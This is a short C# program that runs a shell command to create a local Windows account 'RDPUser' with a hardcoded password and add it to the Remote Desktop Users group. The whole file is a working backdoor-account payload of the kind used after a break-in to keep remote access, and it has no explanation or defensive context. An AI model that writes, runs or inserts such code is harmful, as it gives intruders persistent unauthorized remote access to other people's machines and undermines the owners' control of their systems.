using System;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace WINTRE
{
    class Program
    {
        static void Main(string[] args)
        {
            RDPUser();
        }
        static int RDPUser()
        {
            Process Process = new Process();
            Process.StartInfo.FileName = "cmd";
            Process.StartInfo.Arguments = "/c net user RDPUser RDPPass! /add /active:yes && net localgroup \"Remote Desktop Users\" RDPUser /add";
            Process.StartInfo.UseShellExecute = false;
            Process.StartInfo.RedirectStandardOutput = true;
            Process.StartInfo.RedirectStandardError = true;
            Process.Start();
            string output = Process.StandardOutput.ReadToEnd();
            Console.WriteLine(output);
            Debug.WriteLine(output);
            string err = Process.StandardError.ReadToEnd();
            Console.WriteLine(err);
            Process.WaitForExit();
            return 0;
        }
    }
}